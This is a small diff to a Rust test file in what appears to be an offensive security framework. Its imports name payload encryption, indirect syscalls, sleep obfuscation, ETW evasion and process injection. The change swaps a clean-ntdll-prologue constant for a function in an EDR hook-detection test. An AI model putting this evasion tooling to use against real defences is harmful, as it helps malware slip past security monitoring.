@@ -9,7 +9,7 @@ use crate::payload::encrypt::EncryptMethod;
 use crate::syscall::indirect::ResolutionMethod;
 use crate::evasion::sleep_obfs::SleepMethod;
 use crate::analysis::detect::{
-    check_api, classify_hook, HookStatus, HookType, CLEAN_NT_EPILOGUE, CLEAN_NT_PROLOGUE,
+    check_api, classify_hook, clean_nt_prologue, HookStatus, HookType, CLEAN_NT_EPILOGUE,
 };
 use crate::evasion::etw::EtwTarget;
 use crate::injection::InjectionTechnique;
@@ -351,9 +351,9 @@ fn test_hook_type_display() {
 #[test]
 fn test_clean_prologue_constants() {
     // Verify the known-clean prologue/epilogue byte patterns
-    assert_eq!(CLEAN_NT_PROLOGUE, [0x4C, 0x8B, 0xD1, 0xB8]);
+    assert_eq!(clean_nt_prologue(), [0x4C, 0x8B, 0xD1, 0xB8]);
     assert_eq!(CLEAN_NT_EPILOGUE, [0x48, 0x83, 0xE4, 0xF0]);
-    assert_eq!(CLEAN_NT_PROLOGUE.len(), 4);
+    assert_eq!(clean_nt_prologue().len(), 4);
     assert_eq!(CLEAN_NT_EPILOGUE.len(), 4);
 }
 
